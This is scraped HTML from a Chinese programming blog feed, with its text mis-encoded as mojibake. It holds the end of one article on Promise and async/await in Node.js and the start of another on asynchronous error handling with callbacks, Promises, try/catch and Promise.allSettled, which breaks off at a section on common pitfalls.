<p>Promise è™½ç„¶å¥½ç”¨ï¼Œä½†é“¾å¼ç»“æ„åœ¨å¤æ‚é€»è¾‘ä¸­ä»æ˜¾å†—é•¿ã€‚å› æ­¤ï¼ŒES8 å¼•å…¥äº† async/awaitï¼Œè®©å¼‚æ­¥å†™æ³•æ›´æ¥è¿‘åŒæ­¥æ€ç»´ã€‚</p>
<h3 data-id="heading-4">1. async/await ç”¨æ³•ç¤ºä¾‹</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">delay</span>(<span class="hljs-params">ms</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¼€å§‹"</span>);
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"ç­‰å¾…ç»“æŸ"</span>);
}

<span class="hljs-title function_">run</span>();
</code></pre>
<p>ä½¿ç”¨ <code>await</code> æ—¶ï¼Œå‡½æ•°å¿…é¡»å®šä¹‰ä¸º <code>async</code>ã€‚
å…¶æ•ˆæœç›¸å½“äºæš‚åœä»£ç æ‰§è¡Œï¼Œä½†ä¸ä¼šé˜»å¡ Node.js ä¸»çº¿ç¨‹ï¼Œéå¸¸é€‚åˆé€»è¾‘æ¸…æ™°çš„å¼‚æ­¥æµç¨‹ã€‚</p>
<h3 data-id="heading-5">2. é”™è¯¯å¤„ç†æ›´ç›´è§‚</h3>
<p>Promise ä¸­éœ€è¦ <code>.catch()</code> æ¥æ•è·é”™è¯¯ï¼Œ
è€Œ async/await å¯ä»¥ç›´æ¥ä½¿ç”¨ try/catchï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">readFileAsync</span>(<span class="hljs-string">"demo.txt"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"è¯»å–å¤±è´¥ï¼š"</span>, err);
  }
}
</code></pre>
<p>è¿™è®©é”™è¯¯å¤„ç†æ–¹å¼æ›´åŠ æ¥è¿‘åŒæ­¥ä»£ç ã€‚</p>
<hr/>
<h2 data-id="heading-6">ä¸‰ã€Promise ä¸ async/await çš„å…³ç³»</h2>
<p>å¾ˆå¤šäººä¼šè¯¯ä»¥ä¸º async/await å¯ä»¥å®Œå…¨å–ä»£ Promiseï¼Œä½†æœ¬è´¨ä¸Š async/await åªæ˜¯ Promise çš„è¯­æ³•ç³–ï¼Œåº•å±‚ä»ä¾èµ– Promise çš„çŠ¶æ€æœºåˆ¶ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getValue</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-number">123</span>;
}
</code></pre>
<p>ç­‰ä»·äºï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getValue</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">123</span>);
}
</code></pre>
<p>ç†è§£ Promise æ˜¯æŒæ¡ async/await çš„åŸºç¡€ã€‚</p>
<hr/>
<h2 data-id="heading-7">å››ã€å®é™…é¡¹ç›®ä¸­çš„å¸¸è§æ¨¡å¼</h2>
<h3 data-id="heading-8">1. å¹¶å‘æ‰§è¡Œå¤šä¸ªä»»åŠ¡</h3>
<p>å¦‚æœå¤šä¸ªä»»åŠ¡äº’ä¸ä¾èµ–ï¼Œå¯ä»¥ç”¨ <code>Promise.all</code> æå‡æ€§èƒ½ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> [a, b, c] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">doA</span>(), <span class="hljs-title function_">doB</span>(), <span class="hljs-title function_">doC</span>()]);
</code></pre>
<p>é¿å…è¿™æ ·å†™ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = <span class="hljs-keyword">await</span> <span class="hljs-title function_">doA</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">await</span> <span class="hljs-title function_">doB</span>();
<span class="hljs-keyword">const</span> c = <span class="hljs-keyword">await</span> <span class="hljs-title function_">doC</span>();
</code></pre>
<p>åè€…æ˜¯ä¸²è¡Œæ‰§è¡Œï¼Œæ€§èƒ½æ›´ä½ã€‚</p>
<h3 data-id="heading-9">2. ä½¿ç”¨ util.promisify è½¬æ¢å›è°ƒ API</h3>
<p>Node.js åŸç”Ÿå¾ˆå¤š API ä»ç„¶ä½¿ç”¨å›è°ƒï¼Œä¾‹å¦‚ fs.readFileã€‚
å¯ä»¥é€šè¿‡ promisify è½¬æ¢ä¸º Promise æ ¼å¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">"util"</span>);
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-keyword">const</span> readFile = util.<span class="hljs-title function_">promisify</span>(fs.<span class="hljs-property">readFile</span>);

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">readFile</span>(<span class="hljs-string">"demo.txt"</span>, <span class="hljs-string">"utf8"</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
}
</code></pre>
<p>è¿™æ ·å°±èƒ½è‡ªç„¶åœ°ä½¿ç”¨ async/awaitã€‚</p>
<h3 data-id="heading-10">3. å¤„ç†å¤šä¸ª Promise çš„é”™è¯¯</h3>
<p>å½“ä½ ä½¿ç”¨ <code>Promise.all</code> æ—¶ï¼Œæœ‰ä»»ä½•ä¸€ä¸ªä»»åŠ¡å‡ºé”™ï¼Œéƒ½å¯èƒ½å¯¼è‡´æ•´ä½“å¤±è´¥ã€‚
æ›´å®‰å…¨çš„æ–¹å¼æ˜¯ä½¿ç”¨ <code>Promise.allSettled</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">allSettled</span>([<span class="hljs-title function_">taskA</span>(), <span class="hljs-title function_">taskB</span>(), <span class="hljs-title function_">taskC</span>()]);
</code></pre>
<p>éå¸¸é€‚åˆæ‰¹é‡ä»»åŠ¡å¤„ç†åœºæ™¯ã€‚</p>
<hr/>
<h2 data-id="heading-11">äº”ã€å¸¸è§é™·é˜±ä¸æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-12">1. é¿å…åœ¨ forEach ä¸­ä½¿ç”¨ await</h3>
<p>å› ä¸º forEach ä¸æ”¯æŒå¼‚æ­¥ç­‰å¾…ï¼Œä¼šå¯¼è‡´æœªæŒ‰é¢„æœŸæ‰§è¡Œã€‚</p>
<p>é”™è¯¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js">list.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">async</span> (item) =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">process</span>(item);
});
</code></pre>
<p>æ­£ç¡®æ–¹å¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> list) {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">process</span>(item);
}
</code></pre>
<h3 data-id="heading-13">2. await å¤šå±‚åµŒå¥—é€ æˆæ€§èƒ½æŸè€—</h3>
<p>å¦‚æœä»»åŠ¡æ²¡æœ‰ä¾èµ–å…³ç³»ï¼Œåº”è¯¥ä½¿ç”¨ Promise å¹¶å‘è€Œä¸æ˜¯ await æ¥ç­‰å¾…æ¯ä¸€æ­¥ã€‚</p>
<h3 data-id="heading-14">3. async å‡½æ•°é»˜è®¤è¿”å› Promise</h3>
<p>è‹¥æœªæ˜¾å¼ returnï¼Œç»“æœä¼šæ˜¯ <code>Promise&lt;void&gt;</code>ï¼Œéœ€è¦æ³¨æ„å‡½æ•°è¿”å›å€¼ç±»å‹ã€‚</p>
<hr/>
<h2 data-id="heading-15">å…­ã€æ€»ç»“</h2>
<p>Promise å’Œ async/await æ˜¯ç°ä»£ Node.js å¼‚æ­¥ç¼–ç¨‹çš„æ ¸å¿ƒã€‚
ä¸¤è€…å¹¶ä¸æ˜¯äº’ç›¸æ›¿ä»£ï¼Œè€Œæ˜¯å…±åŒç»„æˆå®Œæ•´çš„å¼‚æ­¥è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>Promise è§£å†³å›è°ƒåœ°ç‹±ã€æ”¯æŒé“¾å¼è°ƒç”¨</li>
<li>async/await è®©å¼‚æ­¥ä»£ç æ›´æ¸…æ™°ã€æ›´æ˜“ç»´æŠ¤</li>
<li>Promise æ˜¯ async/await çš„åº•å±‚åŸºç¡€</li>
<li>Promise.all ç­‰å·¥å…·è®©å¹¶å‘ä»»åŠ¡æ›´é«˜æ•ˆ</li>
</ul>
<p>æŒæ¡å®ƒä»¬ä¸ä»…æ˜¯å†™å¥½ Node.js é¡¹ç›®çš„å¿…è¦æŠ€èƒ½ï¼Œä¹Ÿæ˜¯ç†è§£äº‹ä»¶å¾ªç¯ä¸éé˜»å¡ I/O çš„å‰æã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js ç¼–ç¨‹å®æˆ˜ï¼šå…¨é¢ç†è§£å¼‚æ­¥é”™è¯¯å¤„ç†]]></title>    <link>https://juejin.cn/post/7581888578507096091</link>    <guid>https://juejin.cn/post/7581888578507096091</guid>    <pubDate>2025-12-10T00:19:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507096091" data-draft-id="7581698074362069001" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js ç¼–ç¨‹å®æˆ˜ï¼šå…¨é¢ç†è§£å¼‚æ­¥é”™è¯¯å¤„ç†"/> <meta itemprop="keywords" content="åç«¯,Node.js,Trae"/> <meta itemprop="datePublished" content="2025-12-10T00:19:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜çˆ±é’“é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js ç¼–ç¨‹å®æˆ˜ï¼šå…¨é¢ç†è§£å¼‚æ­¥é”™è¯¯å¤„ç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜çˆ±é’“é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:19:17.000Z" title="Wed Dec 10 2025 00:19:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åœ¨ Node.js å¼€å‘ä¸­ï¼Œç¨‹åºçš„å¤§éƒ¨åˆ†æ“ä½œéƒ½æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œä¾‹å¦‚æ–‡ä»¶è¯»å†™ã€ç½‘ç»œè¯·æ±‚ã€æ•°æ®åº“æ“ä½œç­‰ã€‚å¼‚æ­¥å¸¦æ¥äº†é«˜æ€§èƒ½çš„ä¼˜åŠ¿ï¼Œä½†ä¹Ÿè®©é”™è¯¯å¤„ç†å˜å¾—æ›´åŠ å¤æ‚ã€‚å¦‚æœå¤„ç†ä¸å½“ï¼Œé”™è¯¯å¯èƒ½æ‚„æ— å£°æ¯åœ°è¢«å¿½ç•¥ï¼Œå¯¼è‡´ç¨‹åºå¼‚å¸¸ã€èµ„æºæ³„æ¼ï¼Œç”šè‡³æœåŠ¡å´©æºƒã€‚ç†è§£å¹¶æ­£ç¡®æŒæ¡ Node.js çš„å¼‚æ­¥é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œæ˜¯æ„å»ºç¨³å®šå¯é æœåŠ¡çš„é‡è¦å‰æã€‚</p>
</blockquote>
<p>æœ¬æ–‡å°†ç³»ç»Ÿè®²è§£ Node.js ä¸­çš„å¼‚æ­¥é”™è¯¯å¤„ç†ç­–ç•¥ï¼ŒåŒ…æ‹¬å›è°ƒã€Promiseã€async/awaitï¼Œä»¥åŠå¸¸è§é™·é˜±å’Œæœ€ä½³å®è·µã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆå¼‚æ­¥é”™è¯¯å¤„ç†æ›´éš¾ï¼Ÿ</h2>
<p>åœ¨åŒæ­¥ä»£ç ä¸­ï¼Œåªéœ€è¦ try/catch å³å¯æ•è·å¼‚å¸¸ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">"a.txt"</span>);
} <span class="hljs-keyword">catch</span> (err) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
}
</code></pre>
<p>ä½†åœ¨å¼‚æ­¥ä»£ç ä¸­ï¼Œå¼‚å¸¸å¹¶ä¸ä¼šè¢«å¤–å›´çš„ try/catch æ•è·ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">try</span> {
  fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"a.txt"</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
  });
} <span class="hljs-keyword">catch</span> (err) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ•è·ä¸åˆ°é”™è¯¯"</span>);
}
</code></pre>
<p>åŸå› åœ¨äºï¼šå›è°ƒåœ¨æœªæ¥æŸä¸ªæ—¶é—´ç‚¹æ‰§è¡Œï¼Œå·²ç»è„±ç¦»äº† try/catch çš„åŒæ­¥èŒƒå›´ã€‚</p>
<p>å› æ­¤ï¼ŒNode.js å¼•å…¥äº†ä¸åŒé˜¶æ®µçš„é”™è¯¯å¤„ç†æ¨¡å¼ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€å›è°ƒé£æ ¼ä¸­çš„â€œé”™è¯¯ä¼˜å…ˆâ€è§„åˆ™</h2>
<p>Node.js æ‰€æœ‰åŸºäºå›è°ƒçš„ API éƒ½éµå¾ªä¸€ä¸ªçº¦å®šï¼šå›è°ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œæ˜¯é”™è¯¯å¯¹è±¡ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js">fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"demo.txt"</span>, <span class="hljs-string">"utf8"</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"è¯»å–å¤±è´¥ï¼š"</span>, err);
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
});
</code></pre>
<p>è¿™æ˜¯å¤„ç†å¼‚æ­¥é”™è¯¯çš„åŸºç¡€æ–¹å¼ã€‚
å¥½å¤„æ˜¯ï¼š</p>
<ul>
<li>æ˜ç¡®åŒºåˆ†æˆåŠŸå’Œå¤±è´¥</li>
<li>è°ƒç”¨è€…å¿…é¡»æ˜¾å¼å¤„ç†é”™è¯¯ï¼Œé¿å…åé”™</li>
<li>æå‡ä»£ç å®‰å…¨æ€§</li>
</ul>
<p>ä½†éšç€åµŒå¥—å›è°ƒå¢å¤šï¼Œé”™è¯¯å¤„ç†ä¹Ÿä¼šå˜å¾—é‡å¤ç”šè‡³æ··ä¹±ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€Promise ä¸­çš„é”™è¯¯æ•è·</h2>
<p>Promise çš„è®¾è®¡è®©é”™è¯¯å¤„ç†æ›´æ¸…æ™°ï¼Œä»»ä½•æŠ›å‡ºçš„å¼‚å¸¸éƒ½ä¼šè¢« <code>.catch()</code> æ•è·ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"å¤±è´¥äº†"</span>));
})
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {})
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"æ•è·åˆ°é”™è¯¯ï¼š"</span>, err);
  });
</code></pre>
<p>Promise çš„é”™è¯¯å¤„ç†æœ‰å‡ ç§ç‰¹ç‚¹ï¼š</p>
<ol>
<li>åªè¦ reject æˆ–è€… then ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œéƒ½èƒ½è¢« catch æ•è·</li>
<li>åœ¨é“¾å¼è°ƒç”¨ä¸­ï¼Œåªéœ€ä¸€ä¸ª catch å³å¯æ•è·æ‰€æœ‰ä¸Šæ¸¸é”™è¯¯</li>
<li>æœªå¤„ç†çš„ Promise é”™è¯¯ä¼šè§¦å‘ <code>unhandledRejection</code> äº‹ä»¶</li>
</ol>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js">process.<span class="hljs-title function_">on</span>(<span class="hljs-string">"unhandledRejection"</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"æœªæ•è·çš„ Promise é”™è¯¯ï¼š"</span>, err);
});
</code></pre>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè¿™ç±»é”™è¯¯å¿…é¡»è®°å½•ï¼Œå¦åˆ™å°†éš¾ä»¥æ’æŸ¥ã€‚</p>
<hr/>
<h2 data-id="heading-3">å››ã€async/await çš„é”™è¯¯å¤„ç†æ–¹å¼</h2>
<p>async/await æ˜¯æ„å»ºæ•´æ´å¼‚æ­¥ä»£ç çš„å…³é”®ï¼Œä½†é”™è¯¯å¤„ç†ä»ç„¶è¦ä½¿ç”¨ try/catchã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">readFileAsync</span>(<span class="hljs-string">"demo.txt"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"æ•è·é”™è¯¯ï¼š"</span>, err);
  }
}
</code></pre>
<p>try/catch åœ¨ async/await ä¸­æœ‰å‡ ä¸ªä¼˜åŠ¿ï¼š</p>
<ul>
<li>å¯è¯»æ€§å¼ºï¼Œç»“æ„å’ŒåŒæ­¥é€»è¾‘ä¸€è‡´</li>
<li>ä¸€æ®µä»£ç ä¸­å¯ä»¥ç»Ÿä¸€å¤„ç†å¤šä¸ª await çš„é”™è¯¯</li>
<li>è°ƒè¯•æ›´æ–¹ä¾¿</li>
</ul>
<p>ä½†å¸¸è§é”™è¯¯æ˜¯ï¼šæŠŠ try/catch æ”¾é”™ä½ç½®ï¼Œå¯¼è‡´éƒ¨åˆ† await æœªè¢«åŒ…å«ã€‚</p>
<hr/>
<h2 data-id="heading-4">äº”ã€å¦‚ä½•å¤„ç†å¤šä¸ªå¹¶å‘ä»»åŠ¡çš„é”™è¯¯ï¼Ÿ</h2>
<p>å½“å¤šä¸ªå¼‚æ­¥ä»»åŠ¡åŒæ—¶æ‰§è¡Œæ—¶ï¼Œé”™è¯¯å¤„ç†æ–¹å¼æ›´ä¸ºå¤æ‚ã€‚</p>
<h3 data-id="heading-5">1. Promise.allï¼šå…¶ä¸­ä¸€ä¸ªå¤±è´¥å°±å…¨éƒ¨å¤±è´¥</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">taskA</span>(), <span class="hljs-title function_">taskB</span>(), <span class="hljs-title function_">taskC</span>()]);
} <span class="hljs-keyword">catch</span> (err) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"å…¶ä¸­ä¸€ä¸ªä»»åŠ¡å¤±è´¥ï¼š"</span>, err);
}
</code></pre>
<p>é€‚ç”¨äºâ€œä»»åŠ¡å¿…é¡»åŒæ—¶æˆåŠŸâ€çš„åœºæ™¯ã€‚</p>
<hr/>
<h3 data-id="heading-6">2. Promise.allSettledï¼šæ¯ä¸ªä»»åŠ¡ç‹¬ç«‹æ‰§è¡Œ</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">allSettled</span>([<span class="hljs-title function_">taskA</span>(), <span class="hljs-title function_">taskB</span>(), <span class="hljs-title function_">taskC</span>()]);
</code></pre>
<p>è¿”å›ç»“æœä¸­ï¼š</p>
<ul>
<li>fulfilled ä»£è¡¨æˆåŠŸ</li>
<li>rejected ä»£è¡¨å¤±è´¥</li>
</ul>
<p>éå¸¸é€‚åˆæ‰¹é‡å¤„ç†æˆ–ä»»åŠ¡ç»“æœä¸äº’ç›¸ä¾èµ–çš„åœºæ™¯ã€‚</p>
<hr/>
<h2 data-id="heading-7">å…­ã€å¸¸è§çš„å¼‚æ­¥é”™è¯¯é™·é˜±</h2>
<h3 data-id="heading-8">1. å¿˜è®°è¿”å› Promise</h3>
